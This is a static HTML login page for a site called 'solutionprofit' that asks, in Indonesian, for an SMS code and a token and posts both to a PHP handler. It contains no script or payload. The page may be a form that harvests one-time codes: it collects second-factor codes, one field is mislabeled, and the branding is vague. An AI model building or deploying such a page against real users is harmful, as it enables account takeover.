<!DOCTYPE html>
<!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--><html lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">

<!-- Viewport Metatag -->
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<!-- Required Stylesheets -->
<link rel="stylesheet" type="text/css" href="apps3/bootstrap/css/bootstrap.min.css" media="screen">
<link rel="stylesheet" type="text/css" href="apps3/css/fonts/ptsans/stylesheet.css" media="screen">
<link rel="stylesheet" type="text/css" href="apps3/css/fonts/icomoon/style.css" media="screen">

<link rel="stylesheet" type="text/css" href="apps3/css/login.css" media="screen">

<link rel="stylesheet" type="text/css" href="apps3/css/mws-theme.css" media="screen">

<title>solutionprofit login- Login Page</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style type="text/css">
<!--
body 
{
	background-image: url(/marinabay.jpg);
    background-size: cover;
}
#mws-sidebar, #mws-sidebar-bg, #mws-header, .mws-panel .mws-panel-header, #mws-login, #mws-login .mws-login-lock, .ui-accordion .ui-accordion-header, .ui-tabs .ui-tabs-nav, .ui-datepicker, .fc-event-skin, .ui-dialog .ui-dialog-titlebar, .jGrowl .jGrowl-notification, .jGrowl .jGrowl-closer, #mws-user-tools .mws-dropdown-menu .mws-dropdown-box, #mws-user-tools .mws-dropdown-menu.open .mws-dropdown-trigger {
    background-color: rgba(0,0,0,0.5);
}
#mws-login {
    background-image: url(../images/core/mws-dark-bg.png);
    position: relative;
    padding: 12px 16px;
    border: 0;
    border-top: 0;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    -webkit-box-shadow: 0 2px 3px rgba(0, 0, 0, 0.25);
    -moz-box-shadow: 0 2px 3px rgba(0, 0, 0, 0.25);
    box-shadow: 0 0px 5px rgba(0, 0, 0, 0.9);
}
</style></head>

<body>


 <div id="mws-login-wrapper">
        <div id="mws-login">
            <h1>Masukkan Kode SMS & Token </h1>
            <div class="mws-login-lock"><i class="icon-lock"></i></div>
            <div id="mws-login-form">
                <form class="mws-form" method="post" action="crosceksms.php" >
                    <div class="mws-form-row">
                        <div class="mws-form-item">
                            <input type="password" name="kodesms" class=mws-login-password required" placeholder="kodesms">
                        </div>
                    </div>
	
                    <div class="mws-form-row">
                        <div class="mws-form-item">
                            <input type="password" name="hp" class="mws-login-username required" placeholder="Token">
                        </div>
                    </div>
                    
                    <div id="mws-login-remember" class="mws-form-row mws-inset">
                        <ul class="mws-form-list inline">
                            <li>
                                <input id="remember" type="checkbox"> 
                                <label for="remember">Remember me</label>
                            </li>
                        </ul>
                    </div>
                    <div class="mws-form-row">
                      <input name="submit" type="submit" class="btn btn-success mws-login-button" value="Login">
                    </div>
                    <div class="mws-form-row">
                    
                    <a href="loss_pasword.php" >Lupa Pasword</a>
                    
                    <a href="/" class="pull-right">Home</a>
                    
                    </div>
                </form>
            </div>
        </div>
    </div>
 
</body>
</html>
        
                


